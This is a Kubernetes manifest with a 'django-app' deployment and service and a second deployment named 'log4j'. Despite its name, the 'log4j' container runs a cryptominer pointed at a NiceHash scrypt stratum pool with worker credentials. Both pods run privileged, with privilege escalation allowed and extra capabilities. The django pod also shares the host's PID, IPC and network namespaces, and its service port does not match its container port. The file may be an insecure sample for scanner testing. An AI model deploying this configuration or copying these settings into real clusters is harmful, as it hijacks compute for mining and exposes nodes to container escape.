apiVersion: v1
kind: Namespace
metadata:
  name: log4j
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: django-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: django-app
  template:
    metadata:
      labels:
        app: django-app
    spec:
      hostIPC: true
      hostPID: true
      hostNetwork: true
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
        fsGroupChangePolicy: Always
      imagePullSecrets:
      - name: ecr-secret
      containers:
      - name: django-app
        image: "${IMAGE_REGISTRY}"
        ports:
        - containerPort: 8000
        resources:
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 250m
            memory: 256Mi
        securityContext:
          runAsUser: 2000
          runAsNonRoot: true
          allowPrivilegeEscalation: true
          readOnlyRootFilesystem: true
          privileged: true
          capabilities:
            add: ["NET_ADMIN", "SYS_TIME"]
---
apiVersion: v1
kind: Service
metadata:
  name: django-app
spec:
  selector:
    app: django-app
  ports:
    - protocol: TCP
      port: 8004
      targetPort: 8004   
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: log4j
  namespace: log4j
  labels:
    app: log4j
spec:
  replicas: 1
  selector:
    matchLabels:
      app: log4j
  template:
    metadata:
      labels:
        app: log4j
    spec:
      imagePullSecrets:
      - name: ecr-secret
      containers:
      - name: log4j
        image: "${IMAGE_REGISTRY}"
        args:
          - "--url"
          - "stratum+tcp://scrypt.auto.nicehash.com:9200"
          - "--user"
          - "creack.worker1"
          - "--pass"
          - "abcdef"
        ports:
        - containerPort: 4415
        securityContext:
          runAsUser: 2000
          runAsNonRoot: true
          allowPrivilegeEscalation: true
          readOnlyRootFilesystem: true
          privileged: true
          capabilities:
            add: ["NET_ADMIN", "SYS_TIME"]
